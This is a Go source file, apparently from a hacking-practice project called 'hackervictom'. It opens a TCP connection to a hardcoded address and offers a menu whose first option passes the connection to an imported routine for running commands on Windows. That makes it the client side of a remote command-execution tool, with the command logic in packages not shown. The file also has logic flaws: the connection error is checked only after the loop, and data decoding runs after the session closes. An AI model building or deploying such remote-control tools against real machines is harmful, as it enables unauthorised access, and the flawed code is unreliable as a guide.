package main

import (
	"JayneJacobs/hackervictom/core/executecommandwin"
	"JayneJacobs/hackervictom/core/handleconnection"
	"bufio"
	"encoding/gob"
	"fmt"
	"log"
	"os"
	"strings"
)

// Data is teh connection data
type Data struct {
	Name string
	ID   int
	Age  float32
}

// DisplayError formats an error
func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "192.168.221.133"
	Port := "9090"
	connection, err := handleconnection.Client(ServerIP, Port)
	defer connection.Close()

	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl {

		fmt.Printf("[+] Enter Options")
		userinputraw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		userinput := strings.Trim(userinputraw, "\n")

		switch userinput {
		case "1":
			fmt.Println("[+] Command Execution program")
			err := executecommandwin.CommandWindows(connection)
			if err != nil {
				DisplayError(err)
			}
		case "99":
			fmt.Println("[+] Exiting windows")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again!")
		}

	}
	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established", connection.RemoteAddr().String())

	decoder := gob.NewDecoder(connection)

	data := &Data{}

	err = decoder.Decode(data)
	if err != nil {
		fmt.Println("[+] Unable to decode")
		log.Fatal(err)
	}

	fmt.Println("[+] Successfully decoded data")
	fmt.Println(data.Name)
	fmt.Println(data.ID)
	fmt.Println(data.Age)

}
